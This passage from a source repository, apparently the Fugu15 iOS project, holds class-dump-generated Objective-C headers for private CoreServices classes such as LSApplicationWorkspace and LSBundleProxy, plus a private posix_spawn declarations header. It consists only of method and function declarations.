-(NSArray *)activityTypes;
-(NSNumber *)externalVersionIdentifier;
-(BOOL)respondsToSelector:(SEL)arg1 ;
@end


```

`Fugu15/Fugu15/include/LSApplicationWorkspace.h`:

```h
/*
 * This header is generated by classdump-dyld 1.0
 * on Friday, January 21, 2022 at 6:51:04 AM Pacific Standard Time
 * Operating System: Version 15.2.1 (Build 19C63)
 * Image Source: /System/Library/Frameworks/CoreServices.framework/CoreServices
 * classdump-dyld is licensed under GPLv3, Copyright © 2013-2016 by Elias Limneos.
 */

#import <Foundation/Foundation.h>
//#import <CoreServices/CoreServices-Structs.h>

#import "LSApplicationProxy.h"

@class NSMutableDictionary, LSInstallProgressList;

extern NSString *LSInstallTypeKey;

@interface LSApplicationWorkspace : NSObject {
    
    NSMutableDictionary* _createdInstallProgresses;
    LSInstallProgressList* _observedInstallProgresses;
}
@property (readonly) LSInstallProgressList * observedInstallProgresses;              //@synthesize observedInstallProgresses=_observedInstallProgresses - In the implementation block
@property (readonly) NSMutableDictionary * createdInstallProgresses;                 //@synthesize createdInstallProgresses=_createdInstallProgresses - In the implementation block
+(instancetype)defaultWorkspace;
+(id)callbackQueue;
+(id)activeManagedConfigurationRestrictionUUIDs;
+(id)progressQueue;
+(id)_defaultAppQueue;
+(id)_remoteObserver;
-(void)_sf_openURL:(id)arg1 withOptions:(id)arg2 completionHandler:(/*^block*/id)arg3 ;
-(void)_sf_openURL:(id)arg1 inApplication:(id)arg2 withOptions:(id)arg3 completionHandler:(/*^block*/id)arg4 ;
-(BOOL)_sf_shouldOverrideiCloudSharingURL:(id)arg1 withAppRedirectURL:(id)arg2 referrerURL:(id)arg3 loadedUsingDesktopUserAgent:(BOOL)arg4 ;
-(void)_sf_tryOpeningURLInDefaultApp:(id)arg1 isContentManaged:(BOOL)arg2 completionHandler:(/*^block*/id)arg3 ;
-(BOOL)revertContainerizedApplicationWithIdentifier:(id)arg1 options:(id)arg2 returningRecordPromise:(id*)arg3 error:(id*)arg4 progressBlock:(/*^block*/id)arg5 ;
-(BOOL)installContainerizedApplicationArtifactAtURL:(id)arg1 withOptions:(id)arg2 returningRecordPromise:(id*)arg3 error:(id*)arg4 progressBlock:(/*^block*/id)arg5 ;
//-(id)operationToOpenResource:(id)arg1 usingApplication:(id)arg2 uniqueDocumentIdentifier:(id)arg3 isContentManaged:(BOOL)arg4 sourceAuditToken:(const SCD_Struct_FS1*)arg5 userInfo:(id)arg6 options:(id)arg7 delegate:(id)arg8 ;
-(id)operationToOpenResource:(id)arg1 usingApplication:(id)arg2 uniqueDocumentIdentifier:(id)arg3 userInfo:(id)arg4 delegate:(id)arg5 ;
-(id)observerProxy;
-(void)openUserActivity:(id)arg1 withApplicationProxy:(id)arg2 completionHandler:(/*^block*/id)arg3 ;
-(void)openUserActivityWithUUID:(id)arg1 activityType:(id)arg2 usingApplicationRecord:(id)arg3 configuration:(id)arg4 completionHandler:(/*^block*/id)arg5 ;
-(BOOL)updatePlaceholderMetadataForApp:(id)arg1 installType:(unsigned long long)arg2 failure:(unsigned long long)arg3 underlyingError:(id)arg4 source:(unsigned long long)arg5 outError:(id*)arg6 ;
-(void)_openUserActivity:(id)arg1 orUserActivityUUID:(id)arg2 activityTypeForUUID:(id)arg3 withApplicationProxy:(id)arg4 options:(id)arg5 completionHandler:(/*^block*/id)arg6 ;
-(BOOL)updateRecordForApp:(id)arg1 withSINF:(id)arg2 iTunesMetadata:(id)arg3 placeholderMetadata:(id)arg4 sendNotification:(int)arg5 error:(id*)arg6 ;
-(BOOL)installContainerizedApplicationArtifactAtURL:(id)arg1 withOptions:(id)arg2 error:(id*)arg3 progressBlock:(/*^block*/id)arg4 ;
-(BOOL)uninstallContainerizedApplicationWithIdentifier:(id)arg1 options:(id)arg2 error:(id*)arg3 progressBlock:(/*^block*/id)arg4 ;
-(void)openApplicationWithBundleIdentifier:(id)arg1 configuration:(id)arg2 completionHandler:(/*^block*/id)arg3 ;
-(void)openApplicationWithBundleIdentifier:(id)arg1 usingConfiguration:(id)arg2 completionHandler:(/*^block*/id)arg3 ;
-(void)openUserActivity:(id)arg1 usingApplicationRecord:(id)arg2 configuration:(id)arg3 completionHandler:(/*^block*/id)arg4 ;
-(BOOL)updateiTunesMetadataWithData:(id)arg1 forApplication:(id)arg2 options:(id)arg3 error:(id*)arg4 ;
-(BOOL)revertContainerizedApplicationWithIdentifier:(id)arg1 options:(id)arg2 error:(id*)arg3 progressBlock:(/*^block*/id)arg4 ;
-(id)operationToOpenResource:(id)arg1 usingApplication:(id)arg2 uniqueDocumentIdentifier:(id)arg3 userInfo:(id)arg4 ;
-(BOOL)updatePlaceholderWithBundleIdentifier:(id)arg1 withInstallType:(unsigned long long)arg2 error:(id*)arg3 ;
-(BOOL)_LSPrivateRebuildApplicationDatabasesForSystemApps:(BOOL)arg1 internal:(BOOL)arg2 user:(BOOL)arg3 ;
-(void)removeAllDefaultApplicationPreferencesWithCompletionHandler:(/*^block*/id)arg1 ;
-(void)openUserActivity:(id)arg1 withApplicationProxy:(id)arg2 options:(id)arg3 completionHandler:(/*^block*/id)arg4 ;
-(void)_LSPrivateSetRemovedSystemAppIdentifiers:(id)arg1 ;
-(void)rebuildDatabaseContentForFrameworkAtURL:(id)arg1 completionHandler:(/*^block*/id)arg2 ;
-(BOOL)installApplication:(NSURL*)arg1 withOptions:(NSDictionary*)arg2 error:(NSError**)arg3 usingBlock:(void (^)(id obj, void *unk))arg4 ;
-(id)operationToOpenResource:(id)arg1 usingApplication:(id)arg2 uniqueDocumentIdentifier:(id)arg3 sourceIsManaged:(BOOL)arg4 userInfo:(id)arg5 delegate:(id)arg6 ;
-(BOOL)isApplicationAvailableToOpenURL:(id)arg1 includePrivateURLSchemes:(BOOL)arg2 error:(id*)arg3 ;
-(id)operationToOpenResource:(id)arg1 usingApplication:(id)arg2 uniqueDocumentIdentifier:(id)arg3 sourceIsManaged:(BOOL)arg4 userInfo:(id)arg5 options:(id)arg6 delegate:(id)arg7 ;
-(BOOL)_getBundleIdentifierForBundleAtURL:(id)arg1 invokeUpdateBlockAndReregister:(/*^block*/id)arg2 error:(id*)arg3 ;
-(BOOL)registerPlugin:(id)arg1 ;
-(id)scanForApplicationStateChangesFromRank:(id)arg1 toRank:(id)arg2 ;
-(id)remoteObserver;
-(void)acquireDatabase;
-(id)pluginsWithIdentifiers:(id)arg1 protocols:(id)arg2 version:(id)arg3 ;
-(void)setDefaultWebBrowserToApplicationRecord:(id)arg1 completionHandler:(/*^block*/id)arg2 ;
-(void)relaxApplicationTypeRequirements:(BOOL)arg1 forApplicationRecord:(id)arg2 completionHandler:(/*^block*/id)arg3 ;
-(id)installProgressForApplication:(id)arg1 withPhase:(unsigned long long)arg2 ;
-(void)setDefaultMailClientToApplicationRecord:(id)arg1 completionHandler:(/*^block*/id)arg2 ;
-(BOOL)updateSINFWithData:(id)arg1 forApplication:(id)arg2 options:(id)arg3 error:(id*)arg4 ;
-(void)enumerateBundlesOfType:(unsigned long long)arg1 legacySPI:(BOOL)arg2 block:(/*^block*/id)arg3 ;
-(BOOL)ls_injectUTTypeWithDeclaration:(id)arg1 inDatabase:(id)arg2 error:(id*)arg3 ;
-(id)syncObserverProxy;
-(BOOL)registerApplicationDictionary:(id)arg1 withObserverNotification:(int)arg2 ;
-(void)openURL:(id)arg1 configuration:(id)arg2 completionHandler:(/*^block*/id)arg3 ;
-(void)enumeratePluginsMatchingQuery:(id)arg1 withBlock:(/*^block*/id)arg2 ;
-(id)applicationsAvailableForOpeningDocument:(id)arg1 ;
-(BOOL)isApplicationAvailableToOpenURLCommon:(id)arg1 includePrivateURLSchemes:(BOOL)arg2 error:(id*)arg3 ;
-(BOOL)unregisterPlugin:(id)arg1 ;
-(BOOL)uninstallApplication:(id)arg1 withOptions:(id)arg2 error:(NSError**)arg3 usingBlock:(/*^block*/id)arg4 ;
-(BOOL)downgradeApplicationToPlaceholder:(id)arg1 withOptions:(id)arg2 error:(id*)arg3 ;
-(id)privateURLSchemes;
-(id)applicationForUserActivityDomainName:(id)arg1 ;
-(id)bundleIdentifiersForMachOUUIDs:(id)arg1 error:(id*)arg2 ;
-(id)machOUUIDsForBundleIdentifiers:(id)arg1 error:(id*)arg2 ;
-(id)pluginsWithIdentifiers:(id)arg1 protocols:(id)arg2 version:(id)arg3 applyFilter:(/*^block*/id)arg4 ;
-(id)operationToOpenResource:(id)arg1 usingApplication:(id)arg2 userInfo:(id)arg3 ;
-(void)placeholderInstalledForIdentifier:(id)arg1 filterDowngrades:(BOOL)arg2 ;
-(id)applicationProxiesWithPlistFlags:(unsigned)arg1 bundleFlags:(unsigned long long)arg2 ;
-(BOOL)installPhaseFinishedForProgress:(id)arg1 ;
-(void)enumerateApplicationsOfType:(unsigned long long)arg1 block:(/*^block*/id)arg2 ;
-(BOOL)updateSINFWithData:(id)arg1 forApplicationAtURL:(id)arg2 error:(id*)arg3 ;
-(BOOL)updateiTunesMetadataWithData:(id)arg1 forApplicationAtURL:(id)arg2 error:(id*)arg3 ;
-(void)clearCreatedProgressForBundleID:(id)arg1 ;
-(void)removeDeviceIdentifierForVendorName:(id)arg1 bundleIdentifier:(id)arg2 ;
-(void)enumerateApplicationsOfType:(unsigned long long)arg1 legacySPI:(BOOL)arg2 block:(/*^block*/id)arg3 ;
-(void*)ls_testWithCleanDatabaseWithError:(id*)arg1 ;
-(BOOL)getClaimedActivityTypes:(id*)arg1 domains:(id*)arg2 ;
-(BOOL)uninstallApplication:(id)arg1 withOptions:(id)arg2 usingBlock:(void(^)(void))arg3 ;
-(BOOL)initiateProgressForApp:(id)arg1 withType:(unsigned long long)arg2 ;
-(void)enumerateBundlesOfType:(unsigned long long)arg1 usingBlock:(/*^block*/id)arg2 ;
-(id)applicationsAvailableForOpeningURL:(id)arg1 legacySPI:(BOOL)arg2 ;
-(id)pluginsWithIdentifiers:(id)arg1 protocols:(id)arg2 version:(id)arg3 withFilter:(/*^block*/id)arg4 ;
-(BOOL)installApplication:(NSURL*)arg1 withOptions:(NSDictionary*)arg2 error:(NSError**)arg3 ;
-(id)scanForApplicationStateChangesWithWhitelist:(id)arg1 ;
-(id)installProgressForBundleID:(id)arg1 makeSynchronous:(unsigned char)arg2 ;
-(BOOL)garbageCollectDatabaseWithError:(id*)arg1 ;
-(id)_LSPrivateRemovedSystemAppIdentifiers;
-(void)sendApplicationStateChangedNotificationsFor:(id)arg1 completion:(/*^block*/id)arg2 ;
-(id)directionsApplications;
-(BOOL)openURL:(id)arg1 withOptions:(id)arg2 ;
-(BOOL)openApplicationWithBundleID:(id)arg1 ;
-(id)installedPlugins;
-(void)_LSPrivateSyncWithMobileInstallation;
-(BOOL)registerApplication:(id)arg1 ;
-(id)createDeviceIdentifierWithVendorName:(id)arg1 bundleIdentifier:(id)arg2 ;
-(BOOL)unregisterApplication:(id)arg1 ;
-(id)applicationsWithUIBackgroundModes;
-(BOOL)invalidateIconCache:(id)arg1 ;
-(id)legacyApplicationProxiesListWithType:(unsigned long long)arg1 ;
-(id)publicURLSchemes;
-(BOOL)establishConnection;
-(void)_LSClearSchemaCaches;
-(id)pluginsMatchingQuery:(id)arg1 applyFilter:(/*^block*/id)arg2 ;
-(BOOL)uninstallApplication:(id)arg1 withOptions:(id)arg2 ;
-(BOOL)openSensitiveURL:(id)arg1 withOptions:(id)arg2 error:(id*)arg3 ;
-(id)applicationsForUserActivityType:(id)arg1 limit:(unsigned long long)arg2 ;
-(id)deviceIdentifierForVendorSeedData;
-(void)getKnowledgeUUID:(id*)arg1 andSequenceNumber:(id*)arg2 ;
-(id)applicationsOfType:(unsigned long long)arg1 ;
-(id)applicationsAvailableForOpeningURL:(id)arg1 ;
-(BOOL)isVersion:(id)arg1 greaterThanOrEqualToVersion:(id)arg2 ;
-(NSMutableDictionary *)createdInstallProgresses;
-(id)applicationForUserActivityType:(id)arg1 ;
-(id)unrestrictedApplications;
-(id)removedSystemApplications;
-(void)_LSPrivateUpdateAppRemovalRestrictions;
-(BOOL)restoreSystemApplication:(id)arg1 ;
-(id)deviceIdentifierForVendor;
-(LSInstallProgressList *)observedInstallProgresses;
-(BOOL)openURL:(id)arg1 ;
-(id)applicationsWithAudioComponents;
-(BOOL)isApplicationAvailableToOpenURL:(id)arg1 error:(id*)arg2 ;
-(id)optionsFromOpenConfiguration:(id)arg1 ;
-(void)ls_resetTestingDatabase;
-(id)placeholderApplications;
-(void)enumerateBundlesOfType:(unsigned long long)arg1 block:(/*^block*/id)arg2 ;
-(void)_LSFailedToOpenURL:(id)arg1 withBundle:(id)arg2 ;
-(BOOL)installApplication:(NSURL*)arg1 withOptions:(NSDictionary*)arg2 ;
-(BOOL)registerApplicationDictionary:(NSDictionary*)arg1 ;
-(id)allInstalledApplications;
-(BOOL)openSensitiveURL:(id)arg1 withOptions:(id)arg2 ;
-(id)deviceIdentifierForAdvertising;
-(id)scanForForDeletableSystemApps;
-(BOOL)_LSPrivateDatabaseNeedsRebuild;
-(id)applicationForOpeningResource:(id)arg1 ;
-(id)URLOverrideForURL:(id)arg1 ;
-(BOOL)openURL:(id)arg1 withOptions:(id)arg2 error:(id*)arg3 ;
-(id)URLOverrideForNewsURL:(id)arg1 ;
-(id)applicationsWithVPNPlugins;
-(void)clearAdvertisingIdentifier;
-(NSArray<LSApplicationProxy*>*)allApplications;
-(void)addObserver:(id)arg1 ;
-(void)removeObserver:(id)arg1 ;
-(id)applicationsAvailableForHandlingURLScheme:(id)arg1 ;
-(BOOL)allowsAlternateIcons;
-(BOOL)applicationIsInstalled:(id)arg1 ;
-(id)applicationsForUserActivityType:(id)arg1 ;
@end

```

`Fugu15/Fugu15/include/LSBundleProxy.h`:

```h
/*
* This header is generated by classdump-dyld 1.0
* on Friday, January 21, 2022 at 6:51:04 AM Pacific Standard Time
* Operating System: Version 15.2.1 (Build 19C63)
* Image Source: /System/Library/Frameworks/CoreServices.framework/CoreServices
* classdump-dyld is licensed under GPLv3, Copyright © 2013-2016 by Elias Limneos.
*/

#import <Foundation/Foundation.h>
//#import <CoreServices/CoreServices-Structs.h>
//#import <CoreServices/LSResourceProxy.h>
//#import <libobjc.A.dylib/NSSecureCoding.h>

@class NSString, NSURL, NSUUID, NSArray, _LSLazyPropertyList, LSApplicationProxy, NSDictionary, LSContext;

@interface LSBundleProxy : NSObject /*LSResourceProxy <NSSecureCoding>*/ {

	NSString* _localizedShortName;
	BOOL _foundBackingBundle;
	BOOL _containerized;
	NSString* _bundleIdentifier;
	NSURL* _bundleURL;
	NSString* _bundleExecutable;
	NSURL* _bundleContainerURL;
	NSString* _bundleVersion;
	NSString* _sdkVersion;
	NSUUID* _cacheGUID;
	unsigned long long _sequenceNumber;
	NSArray* _machOUUIDs;
	unsigned long long _compatibilityState;
	_LSLazyPropertyList* __infoDictionary;
	_LSLazyPropertyList* __entitlements;
	_LSLazyPropertyList* __environmentVariables;

}

@property (readonly) BOOL _inf_isSystem; 
@property (readonly) BOOL if_isSystem; 
@property (readonly) BOOL if_isAppExtension; 
@property (readonly) BOOL if_isWatchKitAppExtension; 
@property (readonly) LSApplicationProxy * if_containingAppProxy; 
@property (nonatomic,readonly) NSString * localizedShortName; 
@property (setter=_setInfoDictionary:,nonatomic,copy) _LSLazyPropertyList * _infoDictionary;                          //@synthesize _infoDictionary=__infoDictionary - In the implementation block
@property (nonatomic,copy) NSArray * machOUUIDs;                                                                      //@synthesize machOUUIDs=_machOUUIDs - In the implementation block
@property (setter=setSDKVersion:,nonatomic,copy) NSString * sdkVersion;                                               //@synthesize sdkVersion=_sdkVersion - In the implementation block
@property (setter=_setEntitlements:,nonatomic,copy) _LSLazyPropertyList * _entitlements;                              //@synthesize _entitlements=__entitlements - In the implementation block
@property (setter=_setEnvironmentVariables:,nonatomic,copy) _LSLazyPropertyList * _environmentVariables;              //@synthesize _environmentVariables=__environmentVariables - In the implementation block
@property (assign,setter=_setCompatibilityState:,nonatomic) unsigned long long compatibilityState;                    //@synthesize compatibilityState=_compatibilityState - In the implementation block
@property (nonatomic,readonly) NSString * bundleIdentifier;                                                           //@synthesize bundleIdentifier=_bundleIdentifier - In the implementation block
@property (nonatomic,readonly) NSString * bundleType; 
@property (nonatomic,readonly) NSURL * bundleURL;                                                                     //@synthesize bundleURL=_bundleURL - In the implementation block
@property (nonatomic,readonly) NSString * bundleExecutable;                                                           //@synthesize bundleExecutable=_bundleExecutable - In the implementation block
@property (nonatomic,readonly) NSString * canonicalExecutablePath; 
@property (nonatomic,readonly) NSURL * containerURL; 
@property (nonatomic,readonly) NSURL * dataContainerURL; 
@property (nonatomic,readonly) NSURL * bundleContainerURL;                                                            //@synthesize bundleContainerURL=_bundleContainerURL - In the implementation block
@property (nonatomic,readonly) NSURL * appStoreReceiptURL; 
@property (nonatomic,readonly) NSString * bundleVersion;                                                              //@synthesize bundleVersion=_bundleVersion - In the implementation block
@property (nonatomic,readonly) NSString * signerIdentity; 
@property (nonatomic,readonly) NSDictionary * entitlements; 
@property (nonatomic,readonly) NSDictionary * environmentVariables; 
@property (nonatomic,readonly) NSDictionary * groupContainerURLs; 
@property (nonatomic,readonly) BOOL foundBackingBundle;                                                               //@synthesize foundBackingBundle=_foundBackingBundle - In the implementation block
@property (getter=isContainerized,nonatomic,readonly) BOOL containerized;                                             //@synthesize containerized=_containerized - In the implementation block
@property (nonatomic,readonly) BOOL profileValidated; 
@property (nonatomic,readonly) BOOL UPPValidated; 
@property (nonatomic,readonly) BOOL freeProfileValidated; 
@property (nonatomic,readonly) NSString * signerOrganization; 
@property (nonatomic,readonly) NSUUID * cacheGUID;                                                                    //@synthesize cacheGUID=_cacheGUID - In the implementation block
@property (nonatomic,readonly) unsigned long long sequenceNumber;                                                     //@synthesize sequenceNumber=_sequenceNumber - In the implementation block
+(id)hk_appExtensionContainerBundleForConnection:(id)arg1 ;
+(id)bundleProxyForCurrentProcess;
//+(id)bundleProxyWithAuditToken:(SCD_Struct_FS1)arg1 error:(id*)arg2 ;
+(BOOL)canInstantiateFromDatabase;
+(id)bundleProxyForURL:(id)arg1 ;
+(void)clearBundleProxyForCurrentProcess;
+(id)bundleProxyForURL:(id)arg1 error:(id*)arg2 ;
+(id)bundleProxyForIdentifier:(id)arg1 ;
+(BOOL)supportsSecureCoding;
-(id)__ck_icon;
-(id)un_applicationBundleIdentifier;
-(id)un_applicationBundleURL;
-(BOOL)if_isWatchKitAppExtension;
-(BOOL)if_isSystem;
-(BOOL)if_isAppExtension;
-(LSApplicationProxy *)if_containingAppProxy;
-(BOOL)_inf_isSystem;
-(NSString *)localizedShortName;
-(NSUUID *)cacheGUID;
-(NSString *)bundleType;
-(_LSLazyPropertyList *)_entitlements;
-(NSURL *)containerURL;
-(id)localizedName;
-(id)_localizedNameWithPreferredLocalizations:(id)arg1 useShortNameOnly:(BOOL)arg2 ;
-(NSDictionary *)environmentVariables;
-(id)_initWithBundleUnit:(unsigned)arg1 context:(LSContext*)arg2 bundleType:(unsigned long long)arg3 bundleID:(id)arg4 localizedName:(id)arg5 bundleContainerURL:(id)arg6 dataContainerURL:(id)arg7 resourcesDirectoryURL:(id)arg8 iconsDictionary:(id)arg9 iconFileNames:(id)arg10 version:(id)arg11 ;
-(id)objectForInfoDictionaryKey:(id)arg1 ofClass:(Class)arg2 valuesOfClass:(Class)arg3 ;
-(NSURL *)bundleContainerURL;
-(void)setSDKVersion:(NSString*)arg1 ;
-(void)setMachOUUIDs:(NSArray *)arg1 ;
-(NSDictionary *)groupContainerURLs;
-(_LSLazyPropertyList *)_infoDictionary;
-(id)_managedPersonas;
-(BOOL)_usesSystemPersona;
-(id)localizedNameWithPreferredLocalizations:(id)arg1 useShortNameOnly:(BOOL)arg2 ;
-(id)entitlementValueForKey:(id)arg1 ofClass:(Class)arg2 valuesOfClass:(Class)arg3 ;
-(void)_setEntitlements:(_LSLazyPropertyList*)arg1 ;
-(NSString *)bundleExecutable;
-(NSURL *)appStoreReceiptURL;
-(BOOL)foundBackingBundle;
-(id)objectForInfoDictionaryKey:(id)arg1 ofClass:(Class)arg2 ;
-(BOOL)_hasAssociatedPersonas;
-(id)localizedValuesForKeys:(id)arg1 fromTable:(id)arg2 ;
-(id)appStoreReceiptName;
-(_LSLazyPropertyList *)_environmentVariables;
-(void)_setInfoDictionary:(_LSLazyPropertyList*)arg1 ;
-(id)_valueForEqualityTesting;
-(NSURL *)dataContainerURL;
-(NSURL *)bundleURL;
-(id)entitlementValuesForKeys:(id)arg1 ;
-(void)_setEnvironmentVariables:(_LSLazyPropertyList*)arg1 ;
-(id)entitlementValueForKey:(id)arg1 ofClass:(Class)arg2 ;
-(NSString *)canonicalExecutablePath;
-(id)objectsForInfoDictionaryKeys:(id)arg1 ;
-(void)_setCompatibilityState:(unsigned long long)arg1 ;
-(unsigned long long)sequenceNumber;
-(void)encodeWithCoder:(id)arg1 ;
-(NSString *)bundleVersion;
-(NSString *)signerIdentity;
-(NSString *)signerOrganization;
-(unsigned long long)compatibilityState;
-(NSDictionary *)entitlements;
-(BOOL)isEqual:(id)arg1 ;
-(id)initWithCoder:(id)arg1 ;
-(BOOL)isContainerized;
-(NSArray *)machOUUIDs;
-(NSString *)bundleIdentifier;
-(unsigned long long)hash;
-(NSString *)sdkVersion;
@end


```

`Fugu15/Fugu15/include/_LSApplicationState.h`:

```h
/*
* This header is generated by classdump-dyld 1.0
* on Friday, January 21, 2022 at 6:51:04 AM Pacific Standard Time
* Operating System: Version 15.2.1 (Build 19C63)
* Image Source: /System/Library/Frameworks/CoreServices.framework/CoreServices
* classdump-dyld is licensed under GPLv3, Copyright © 2013-2016 by Elias Limneos.
*/

#import <Foundation/Foundation.h>
//#import <CoreServices/CoreServices-Structs.h>
//#import <libobjc.A.dylib/NSCopying.h>
//#import <libobjc.A.dylib/NSSecureCoding.h>

@class NSString;

@interface _LSApplicationState : NSObject <NSCopying, NSSecureCoding> {

	NSString* _bundleIdentifier;
	unsigned long long _stateFlags;
	int _ratingRank;
	unsigned long long _installType;

}

@property (nonatomic,readonly) unsigned long long installType; 
@property (nonatomic,copy,readonly) NSString * bundleIdentifier;                             //@synthesize bundleIdentifier=_bundleIdentifier - In the implementation block
@property (getter=isInstalled,nonatomic,readonly) BOOL installed; 
@property (getter=isPlaceholder,nonatomic,readonly) BOOL placeholder; 
@property (getter=isValid,nonatomic,readonly) BOOL valid; 
@property (getter=isRestricted,nonatomic,readonly) BOOL restricted; 
@property (getter=isRemovedSystemApp,nonatomic,readonly) BOOL removedSystemApp; 
@property (getter=isBlocked,nonatomic,readonly) BOOL blocked; 
@property (getter=isAlwaysAvailable,nonatomic,readonly) BOOL alwaysAvailable; 
@property (getter=isDowngraded,nonatomic,readonly) BOOL downgraded; 
+(BOOL)supportsSecureCoding;
-(BOOL)isInstalled;
-(void)addStateFlag:(unsigned long long)arg1 ;
-(void)encodeWithCoder:(id)arg1 ;
-(BOOL)isRemovedSystemApp;
-(unsigned long long)installType;
-(BOOL)isPlaceholder;
-(BOOL)isRestricted;
-(BOOL)isBlocked;
-(id)description;
-(id)initWithBundleIdentifier:(id)arg1 stateFlags:(unsigned long long)arg2 ratingRank:(int)arg3 installType:(unsigned long long)arg4 ;
-(id)initWithCoder:(id)arg1 ;
-(id)copyWithZone:(NSZone*)arg1 ;
-(NSString *)bundleIdentifier;
-(BOOL)isDowngraded;
-(BOOL)isAlwaysAvailable;
-(BOOL)isValid;
@end


```

`Fugu15/Fugu15/include/posix_spawn.h`:

```h
/*
 * Copyright (c) 2006, 2008 Apple,Inc. All rights reserved.
 *
 * @APPLE_LICENSE_HEADER_START@
 *
 * This file contains Original Code and/or Modifications of Original Code
 * as defined in and that are subject to the Apple Public Source License
 * Version 2.0 (the 'License'). You may not use this file except in
 * compliance with the License. Please obtain a copy of the License at
 * http://www.opensource.apple.com/apsl/ and read it before using this
 * file.
 *
 * The Original Code and all software distributed under the License are
 * distributed on an 'AS IS' basis, WITHOUT WARRANTY OF ANY KIND, EITHER
 * EXPRESS OR IMPLIED, AND APPLE HEREBY DISCLAIMS ALL SUCH WARRANTIES,
 * INCLUDING WITHOUT LIMITATION, ANY WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE, QUIET ENJOYMENT OR NON-INFRINGEMENT.
 * Please see the License for the specific language governing rights and
 * limitations under the License.
 *
 * @APPLE_LICENSE_HEADER_END@
 */

#ifndef _SPAWN_PRIVATE_H_
#define _SPAWN_PRIVATE_H_

#include <spawn.h>
#include <sys/cdefs.h>
#include <sys/types.h>
#include <Availability.h>
#include <TargetConditionals.h>

#undef __API_AVAILABLE
#define __API_AVAILABLE(...)

__BEGIN_DECLS

int     posix_spawnattr_getpcontrol_np(const posix_spawnattr_t * __restrict, int * __restrict) __API_AVAILABLE(macos(10.6), ios(3.2));
int     posix_spawnattr_setpcontrol_np(posix_spawnattr_t *, const int) __API_AVAILABLE(macos(10.6), ios(3.2));

int     posix_spawnattr_getprocesstype_np(const posix_spawnattr_t * __restrict, int * __restrict) __API_AVAILABLE(macos(10.8), ios(6.0));
int     posix_spawnattr_setprocesstype_np(posix_spawnattr_t *, const int) __API_AVAILABLE(macos(10.8), ios(6.0));

int     posix_spawnattr_setcpumonitor(posix_spawnattr_t * __restrict, uint64_t, uint64_t) __API_AVAILABLE(macos(10.8), ios(6.0));
int     posix_spawnattr_getcpumonitor(posix_spawnattr_t * __restrict, uint64_t *, uint64_t *) __API_AVAILABLE(macos(10.8), ios(6.0));
int     posix_spawnattr_setcpumonitor_default(posix_spawnattr_t * __restrict) __API_AVAILABLE(macos(10.9), ios(6.0));

#if (TARGET_OS_IPHONE && !TARGET_OS_SIMULATOR)
int     posix_spawnattr_setjetsam(posix_spawnattr_t * __restrict attr,
    short flags, int priority, int memlimit) __API_UNAVAILABLE(macos) __API_AVAILABLE(ios(5.0));
#endif /* (TARGET_OS_IPHONE && !TARGET_OS_SIMULATOR) */

int     posix_spawnattr_setjetsam_ext(posix_spawnattr_t * __restrict attr,
    short flags, int priority, int memlimit_active, int memlimit_inactive) __API_AVAILABLE(macos(10.11), ios(9.0));

// time-to-relaunch after jetsam, set by launchd
int     posix_spawnattr_set_jetsam_ttr_np(const posix_spawnattr_t * __restrict attr, uint32_t count, uint32_t *ttrs_millis) __OSX_AVAILABLE_STARTING(__MAC_10_15, __IPHONE_13_0);

int     posix_spawnattr_set_threadlimit_ext(posix_spawnattr_t * __restrict attr,
    int thread_limit)  __API_AVAILABLE(macos(10.14), ios(12.0), tvos(12.0), watchos(5.0));

#define POSIX_SPAWN_IMPORTANCE_PORT_COUNT 32
int     posix_spawnattr_set_importancewatch_port_np(posix_spawnattr_t * __restrict attr,
    int count, mach_port_t portarray[])  __API_AVAILABLE(macos(10.9), ios(6.0));

int     posix_spawnattr_set_registered_ports_np(posix_spawnattr_t * __restrict attr, mach_port_t portarray[], uint32_t count) __API_AVAILABLE(macos(10.15), ios(13.0), tvos(13.0), watchos(6.0));

int
posix_spawnattr_set_ptrauth_task_port_np(posix_spawnattr_t * __restrict attr,
    mach_port_t port) __API_AVAILABLE(macos(10.16), ios(14.0), tvos(14.0), watchos(7.0));

#define POSIX_SPAWN_MACPOLICYINFO_WITHSIZE 1
int     posix_spawnattr_getmacpolicyinfo_np(const posix_spawnattr_t * __restrict, const char *, void **, size_t *) __API_AVAILABLE(macos(10.9), ios(7.0));
int     posix_spawnattr_setmacpolicyinfo_np(posix_spawnattr_t * __restrict, const char *, void *, size_t) __API_AVAILABLE(macos(10.9), ios(7.0));

int     posix_spawnattr_setcoalition_np(const posix_spawnattr_t * __restrict, uint64_t, int, int) __API_AVAILABLE(macos(10.10), ios(8.0));

int     posix_spawnattr_set_qos_clamp_np(const posix_spawnattr_t * __restrict, uint64_t) __API_AVAILABLE(macos(10.10), ios(8.0));
int     posix_spawnattr_get_qos_clamp_np(const posix_spawnattr_t * __restrict, uint64_t * __restrict) __API_AVAILABLE(macos(10.10), ios(8.0));

int     posix_spawnattr_set_darwin_role_np(const posix_spawnattr_t * __restrict, uint64_t) __API_AVAILABLE(macos(10.11), ios(9.0));
int     posix_spawnattr_get_darwin_role_np(const posix_spawnattr_t * __restrict, uint64_t * __restrict) __API_AVAILABLE(macos(10.11), ios(9.0));

int     posix_spawnattr_set_persona_np(const posix_spawnattr_t * __restrict, uid_t, uint32_t) __API_AVAILABLE(macos(10.11), ios(9.0));
int     posix_spawnattr_set_persona_uid_np(const posix_spawnattr_t * __restrict, uid_t) __API_AVAILABLE(macos(10.11), ios(9.0));
int     posix_spawnattr_set_persona_gid_np(const posix_spawnattr_t * __restrict, gid_t) __API_AVAILABLE(macos(10.11), ios(9.0));
int     posix_spawnattr_set_persona_groups_np(const posix_spawnattr_t * __restrict, int, gid_t * __restrict, uid_t) __API_AVAILABLE(macos(10.11), ios(9.0));

int     posix_spawnattr_set_max_addr_np(const posix_spawnattr_t * __restrict attr, uint64_t max_addr) __API_AVAILABLE(macos(10.14), ios(12.0), tvos(12.0), watchos(5.0));

int     posix_spawnattr_set_uid_np(const posix_spawnattr_t * __restrict, uid_t) __API_AVAILABLE(macos(10.15), ios(13.0), tvos(13.0), watchos(6.0));
int     posix_spawnattr_set_gid_np(const posix_spawnattr_t * __restrict, gid_t) __API_AVAILABLE(macos(10.15), ios(13.0), tvos(13.0), watchos(6.0));
int     posix_spawnattr_set_groups_np(const posix_spawnattr_t * __restrict, int, gid_t * __restrict, uid_t) __API_AVAILABLE(macos(10.15), ios(13.0), tvos(13.0), watchos(6.0));
int     posix_spawnattr_set_login_np(const posix_spawnattr_t * __restrict, const char * __restrict) __API_AVAILABLE(macos(10.15), ios(13.0), tvos(13.0), watchos(6.0));

